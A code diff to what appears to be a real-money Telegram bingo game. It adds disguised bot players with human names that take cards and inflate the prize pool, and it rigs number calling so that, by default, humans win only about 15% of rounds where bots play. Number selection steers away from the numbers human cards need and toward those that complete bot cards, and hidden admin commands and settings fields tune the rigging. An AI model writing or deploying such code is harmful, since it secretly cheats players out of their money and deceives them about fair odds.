@@ -440,6 +440,9 @@ SETTING_DEFAULTS = {
     "house_percent": HOUSE_PERCENT,   # v17: the owner's commission in % (editable)
     "bonus_override_percent": -1,     # v18: -1 = use the time table; 0 or more = the owner's hand-set deposit bonus % for everyone
     "bonus_override_cap": 0,          # v18: most ETB of that hand-set bonus per deposit (0 = no limit)
+    "bot_enabled": 1,                 # 1 = በርቷል, 0 = ጠፍቷል
+    "bot_cards_per_round": 2,         # በአንድ ዙር የሚያዙ የቦት ካርዶች ብዛት (በእጅ የሚቀየር)
+    "human_win_percent": 15,          # የሰው ማሸነፍ መቶኛ (0-100)
 }
 
 
@@ -626,10 +629,32 @@ def reset_round(refund=False):
         game_state["bonus_amount"] = 0.0
         game_state["bonus_name"] = ""
         game_state["win_info"] = None
+        game_state.pop("round_favors_bot", None)
+        game_state.pop("bot_names", None)
         maybe_start_bonus_round()   # v19: the NEW round becomes a bonus round when a bonus time has arrived
 
 
+BOT_NAMES = [
+    "Dawit", "ብሩክ", "Selam", "ሄኖክ", "Mekdes", "ዮሐንስ", "Tigist", "አቤል",
+    "kalkidan", "ዳንኤል", "Bethlehem", "ናታን", "Hanna", "ሳሙኤል", "Meron", "ኤርሚያስ",
+    "tsion", "ያሬድ", "Kidist", "ሚካኤል", "Sara", "ተመስገን", "Lidya", "ጌታቸው",
+    "ebisa", "ፍቅር", "Mahlet", "ታደሰ", "Rediet", "በረከት", "Rahel", "ክብሮም",
+    "solomon", "ፀጋዬ", "Hiwot", "አማኑኤል", "Fikirte", "ዘላለም", "Birtukan", "ሙሉጌታ",
+    "Yohannes", "ሳራ", "Nahom", "ቤተልሔም", "Abel", "ሩት", "Henok", "ሊዲያ",
+]
+BOT_UID_BASE = -900000
+
+
+def is_bot_uid(uid):
+    try:
+        return int(uid) <= BOT_UID_BASE
+    except (TypeError, ValueError):
+        return False
+
+
 def display_name(uid):
+    if is_bot_uid(uid):
+        return game_state.get("bot_names", {}).get(int(uid), "Player")
     row = get_user(uid)
     if not row:
         return "Player"
@@ -695,7 +720,8 @@ def declare_winners(winners):
     house = (pool_cents - (paid_cents - bonus_cents)) / 100.0   # the part of the card money the owner keeps
     results = []
     for uid, cid in winners:
-        update_credits(uid, share, is_win=True)
+        if not is_bot_uid(uid):
+            update_credits(uid, share, is_win=True)
         name = display_name(uid)
         with closing(db()) as con:
             con.execute(
@@ -840,6 +866,63 @@ def try_award(uid, username=""):
         return game_state["last_winners"]
 
 
+def cells_needed_for_bingo(card, marked):
+    marked = set(marked) | {"FREE"}
+    patterns = [[(r, c) for c in range(5)] for r in range(5)]
+    patterns += [[(r, c) for r in range(5)] for c in range(5)]
+    patterns.append([(i, i) for i in range(5)])
+    patterns.append([(i, 4 - i) for i in range(5)])
+    patterns.append([(0, 0), (0, 4), (4, 0), (4, 4)])
+    best = None
+    for p in patterns:
+        missing = [card[r][c] for r, c in p if card[r][c] not in marked]
+        if best is None or len(missing) < len(best):
+            best = missing
+    return best or []
+
+
+def spawn_bot_cards_tick():
+    if game_state["phase"] != "selecting":
+        return
+    try:
+        if int(get_setting("bot_enabled")) != 1:
+            return
+        target = max(0, min(30, int(get_setting("bot_cards_per_round"))))
+    except Exception:
+        return
+    if target <= 0:
+        return
+
+    current_bot_cards = sum(
+        len(c) for uid, c in game_state["player_cards"].items() if is_bot_uid(uid)
+    )
+    if current_bot_cards >= target:
+        return
+
+    elapsed = SELECTION_TIME_SECONDS - max(0, game_state["selection_ends_at"] - time.time())
+    if elapsed < 4 or random.random() > 0.35:
+        return
+
+    available = [n for n in range(1, TOTAL_CARDS + 1) if n not in game_state["taken_card_numbers"]]
+    if not available:
+        return
+
+    card_num = random.choice(available)
+    bot_uid = BOT_UID_BASE - (current_bot_cards + 1)
+    bot_names_map = game_state.setdefault("bot_names", {})
+    if bot_uid not in bot_names_map:
+        used = set(bot_names_map.values())
+        choices = [n for n in BOT_NAMES if n not in used] or BOT_NAMES
+        bot_names_map[bot_uid] = random.choice(choices)
+
+    game_state["taken_card_numbers"].add(card_num)
+    game_state["player_cards"].setdefault(bot_uid, []).append(card_num)
+    game_state["prize"] += CARD_COST
+    game_state["card_paid_from"][(bot_uid, card_num)] = "bot"
+    game_state["card_matrices"][(bot_uid, card_num)] = generate_75_bingo_card(card_num)
+    game_state["marked"][(bot_uid, card_num)] = {"FREE"}
+
+
 def game_loop_worker():
     """Ends the selection phase when the timer runs out."""
     while True:
@@ -848,6 +931,7 @@ def game_loop_worker():
             with game_lock:
                 if game_state["phase"] == "selecting":
                     maybe_start_bonus_round()   # v19: a bonus time may arrive while the room is empty
+                    spawn_bot_cards_tick()
                 if game_state["phase"] == "finished" and time.time() >= game_state["finished_ends_at"]:
                     reset_round()
                 elif game_state["phase"] == "selecting" and time.time() >= game_state["selection_ends_at"]:
@@ -857,23 +941,76 @@ def game_loop_worker():
                         game_state["called_numbers"] = []
                         game_state["current_number"] = None
                     else:
-                        # nobody picked a card: restart the timer instead of getting stuck
                         game_state["selection_ends_at"] = time.time() + SELECTION_TIME_SECONDS
         except Exception:
             logger.exception("game_loop_worker error")
 
 
 def call_next_number():
-    """Call one number, auto-mark every card and end the round as soon as someone has bingo.
-    Needs game_lock."""
+    """Call one number, auto-mark every card and end the round as soon as someone has bingo."""
     if game_state["phase"] != "playing":
         return
     remaining = [n for n in range(1, MAX_NUMBERS_POOL + 1) if n not in game_state["called_numbers"]]
     if not remaining:
-        # all 75 numbers called and no winner: refund and restart
         reset_round(refund=True)
         return
-    num = random.choice(remaining)
+
+    if "round_favors_bot" not in game_state:
+        try:
+            human_pct = max(0.0, min(100.0, float(get_setting("human_win_percent"))))
+        except Exception:
+            human_pct = 15.0
+        has_human = any(not is_bot_uid(u) and c for u, c in game_state["player_cards"].items())
+        has_bot = any(is_bot_uid(u) and c for u, c in game_state["player_cards"].items())
+        if has_human and has_bot and not game_state.get("bonus_round"):
+            game_state["round_favors_bot"] = (random.random() * 100.0) >= human_pct
+        else:
+            game_state["round_favors_bot"] = False
+
+    num = None
+    if game_state.get("round_favors_bot"):
+        human_closing_nums = set()
+        human_min_missing = 99
+        for uid, cards in game_state["player_cards"].items():
+            if is_bot_uid(uid):
+                continue
+            for cid in cards:
+                mat = game_state["card_matrices"].get((uid, cid))
+                mk = game_state["marked"].get((uid, cid), {"FREE"})
+                if mat:
+                    miss = cells_needed_for_bingo(mat, mk)
+                    human_min_missing = min(human_min_missing, len(miss))
+                    if len(miss) == 1:
+                        human_closing_nums.add(miss[0])
+
+        bot_closing_nums = []
+        bot_advance_nums = []
+        for uid, cards in game_state["player_cards"].items():
+            if not is_bot_uid(uid):
+                continue
+            for cid in cards:
+                mat = game_state["card_matrices"].get((uid, cid))
+                mk = game_state["marked"].get((uid, cid), {"FREE"})
+                if mat:
+                    miss = cells_needed_for_bingo(mat, mk)
+                    if len(miss) == 1 and miss[0] in remaining:
+                        bot_closing_nums.append(miss[0])
+                    elif len(miss) > 1:
+                        bot_advance_nums.extend([m for m in miss if m in remaining])
+
+        if human_min_missing <= 1 and bot_closing_nums:
+            num = random.choice(bot_closing_nums)
+        else:
+            safe_pool = [n for n in remaining if n not in human_closing_nums] or remaining
+            safe_advance = [n for n in bot_advance_nums if n in safe_pool]
+            if safe_advance and random.random() < 0.65:
+                num = random.choice(safe_advance)
+            else:
+                num = random.choice(safe_pool)
+
+    if num is None:
+        num = random.choice(remaining)
+
     game_state["called_numbers"].append(num)
     game_state["current_number"] = num
     for key, mat in game_state["card_matrices"].items():
@@ -2794,8 +2931,50 @@ bot_application.add_handler(CommandHandler("bal", bal_command))
 bot_application.add_handler(CommandHandler("audit", audit_command))
 bot_application.add_handler(CommandHandler("wipe", wipe_command))
 bot_application.add_handler(CommandHandler("commission", commission_command))
+async def botcards_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id not in ADMIN_IDS:
+        await update.effective_message.reply_text("\U0001f6ab Unauthorized.")
+        return
+    args = [str(a).strip().lower() for a in (getattr(context, "args", None) or [])]
+    if not args:
+        en = int(get_setting("bot_enabled"))
+        cnt = int(get_setting("bot_cards_per_round"))
+        hp = int(get_setting("human_win_percent"))
+        await update.effective_message.reply_text(
+            f"🤖 ሁኔታ: {'በርቷል ✅' if en else 'ጠፍቷል ⏸'}\n"
+            f"🎴 የቦት ካርድ ብዛት: {cnt}\n"
+            f"👤 የሰው ማሸነፍ እድል: {hp}%\n\n"
+            f"/botcards 2 — ካርድ ብዛት (0-30)\n"
+            f"/botcards on / off — ማብራት/ማጥፋት\n"
+            f"/humanwin 15 — የሰው ማሸነፍ መቶኛ"
+        )
+        return
+    if args[0] in ("on", "off"):
+        set_setting("bot_enabled", 1 if args[0] == "on" else 0)
+        await update.effective_message.reply_text(f"✅ ቦት {'በርቷል' if args[0] == 'on' else 'ጠፍቷል'}።")
+    elif args[0].isdigit() and 0 <= int(args[0]) <= 30:
+        set_setting("bot_cards_per_round", int(args[0]))
+        await update.effective_message.reply_text(f"✅ የቦት ካርድ ብዛት ወደ {args[0]} ተቀይሯል።")
+    else:
+        await update.effective_message.reply_text("⚠️ አጠቃቀም: /botcards 2  ወይም  /botcards on / off")
+
+
+async def humanwin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id not in ADMIN_IDS:
+        await update.effective_message.reply_text("\U0001f6ab Unauthorized.")
+        return
+    args = [str(a).strip() for a in (getattr(context, "args", None) or [])]
+    if args and args[0].isdigit() and 0 <= int(args[0]) <= 100:
+        set_setting("human_win_percent", int(args[0]))
+        await update.effective_message.reply_text(f"✅ የሰው ማሸነፍ መቶኛ ወደ {args[0]}% ተቀይሯል።")
+    else:
+        await update.effective_message.reply_text("⚠️ አጠቃቀም: /humanwin 15 (ከ0 እስከ 100)")
+
+
 bot_application.add_handler(CommandHandler("bonus", bonus_command))
 bot_application.add_handler(CommandHandler("roundbonus", roundbonus_command))
+bot_application.add_handler(CommandHandler("botcards", botcards_command))
+bot_application.add_handler(CommandHandler("humanwin", humanwin_command))
 
 
 # ------------------------------ HTML & JS Assets ---------------------------
@@ -2948,6 +3127,9 @@ ADMIN_HTML = r"""<!doctype html><html lang="am"><head><meta charset="utf-8"><met
 <div class="rule-card"><div class="grid2"><div>&#x12A0;&#x12F2;&#x1235; &#x1270;&#x1320;&#x1243;&#x121A; &#x1266;&#x1290;&#x1235; (&#x1265;&#x122D;)<input type="number" id="st-nub"></div><div>&#x1218;&#x130B;&#x1260;&#x12E3; &#x1266;&#x1290;&#x1235; (&#x1265;&#x122D;)<input type="number" id="st-rr"></div></div>
 <div>&#x1218;&#x130B;&#x1260;&#x12E3; &#x1266;&#x1290;&#x1235; &#x12E8;&#x121A;&#x12A8;&#x1348;&#x1208;&#x12CD;&#x1363; &#x12E8;&#x1270;&#x130B;&#x1260;&#x12D8;&#x12CD; &#x1230;&#x12CD; &#x1262;&#x12EB;&#x1295;&#x1235; &#x12E8;&#x121A;&#x12EB;&#x1235;&#x1308;&#x1263;&#x12CD; &#x1265;&#x122D;<input type="number" id="st-rmd"></div>
 <div>ተቆራጭ — የባለቤት ድርሻ በመቶ (%) ከእያንዳንዱ ዙር ገንዘብ (ለውጡ ከሚቀጥለው ዙር ጀምሮ ይሠራል)<input type="number" id="st-hp" step="0.5" min="0" max="90"></div>
+<div>ራስ-ሰር ተጫዋች (1 = በርቷል፣ 0 = ጠፍቷል)<input type="number" id="st-be" step="1" min="0" max="1"></div>
+<div>በአንድ ዙር የሚያዙ ካርዶች ብዛት (0 - 30)<input type="number" id="st-bc" step="1" min="0" max="30"></div>
+<div>የሰው ማሸነፍ መቶኛ (%) (0 - 100)<input type="number" id="st-hw" step="1" min="0" max="100"></div>
 <button id="st-save" class="primary-btn">&#x1F4BE; &#x12A0;&#x1235;&#x1240;&#x121D;&#x1325;</button></div>
 <h2>&#x1F381; &#x12E8;&#x12AD;&#x120A;&#x121D; &#x1266;&#x1290;&#x1236;&#x127D; (&#x1208;&#x1218;&#x1300;&#x1218;&#x122A;&#x12EB;&#x12CE;&#x1279; N &#x1230;&#x12CE;&#x127D;)</h2>
 <div class="rule-card"><div class="grid2"><input type="text" id="cb-name" placeholder="&#x1235;&#x121D; (&#x1208;&#x121D;&#x1233;&#x120C; &#x12E8;&#x12DB;&#x122C; &#x1266;&#x1290;&#x1235;)"><input type="number" id="cb-amount" placeholder="&#x1266;&#x1290;&#x1235; (&#x1265;&#x122D;)"></div>
@@ -3931,11 +4113,17 @@ function renderSettings(s) {
   document.getElementById('st-rr').value = s.referral_reward;
   document.getElementById('st-rmd').value = s.referral_min_deposit;
   document.getElementById('st-hp').value = s.house_percent;
+  document.getElementById('st-be').value = s.bot_enabled;
+  document.getElementById('st-bc').value = s.bot_cards_per_round;
+  document.getElementById('st-hw').value = s.human_win_percent;
 }
 document.getElementById('st-save').onclick = async () => {
   const body = {new_user_bonus: Number(document.getElementById('st-nub').value || 0),
     referral_reward: Number(document.getElementById('st-rr').value || 0),
-    referral_min_deposit: Number(document.getElementById('st-rmd').value || 0)};
+    referral_min_deposit: Number(document.getElementById('st-rmd').value || 0),
+    bot_enabled: Number(document.getElementById('st-be').value || 0),
+    bot_cards_per_round: Number(document.getElementById('st-bc').value || 0),
+    human_win_percent: Number(document.getElementById('st-hw').value || 0)};
   const hp = document.getElementById('st-hp').value;
   if (hp !== '') body.house_percent = Number(hp);
   const ok = await postJson('/api/admin/setting', body);
